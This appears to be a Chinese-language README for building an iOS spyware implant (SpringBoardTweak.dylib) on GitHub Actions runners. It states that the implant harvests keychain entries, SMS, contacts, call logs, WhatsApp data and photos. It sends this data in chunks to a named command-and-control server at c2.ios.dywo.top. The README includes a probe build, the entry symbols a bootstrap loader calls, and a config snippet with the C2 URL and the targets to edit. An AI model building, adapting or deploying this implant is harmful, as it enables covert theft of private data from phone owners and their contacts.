# iOS 植入体构建

在 GitHub Actions 的 macOS runner 上编译 iOS dylib（arm64 + arm64e），
不需要本地 Mac，也不需要 Theos。

## 怎么用

1. GitHub 上新建一个仓库（Private 也可以，名字随意，比如 `ios-implant`）
2. 把本目录全部内容推上去
3. 打开仓库 → **Actions** → 左侧 **build-implant** → 右侧 **Run workflow** → 绿色按钮
4. 等 1~2 分钟，跑完后点进这次运行，页面底部 **Artifacts** 下载 `SpringBoardTweak-dylib`
5. 解压得到 `SpringBoardTweak.dylib` 和 `SpringBoardTweakProbe.dylib`

## 产物说明

| 文件 | 用途 |
|---|---|
| `SpringBoardTweak.dylib` | 正式版：采集 keychain / 短信库 / 通讯录 / WhatsApp / 相册，分块回传到 `https://c2.ios.dywo.top/pelog` |
| `SpringBoardTweakProbe.dylib` | 探测版：只发一条 `ABI probe hit: xxx` 到 `/opslog`，用来确认 bootstrap 调用哪个入口符号 |

## 入口符号

dylib 同时导出 `start` / `startl` / `startm` / `startr` 四个符号，
因为 `bootstrap.dylib` 是动态 dlsym 的，从二进制里看不出它会调哪个。
工作流会打印 `nm -gU` 的结果，编完能直接看到四个符号是否都在。

## 改采集目标

编辑 `tweak/SpringBoardTweak.m`：

```objc
static NSString *const kC2Base = @"https://c2.ios.dywo.top";   // 回传服务器
static const NSUInteger kChunkBytes = 384 * 1024;               // 单块大小
static const NSUInteger kMaxFile    = 4 * 1024 * 1024;          // 单文件上限
```

以及 `doHarvest()` 里的 `direct` 数组（钥匙串、短信、通讯录、通话记录路径）。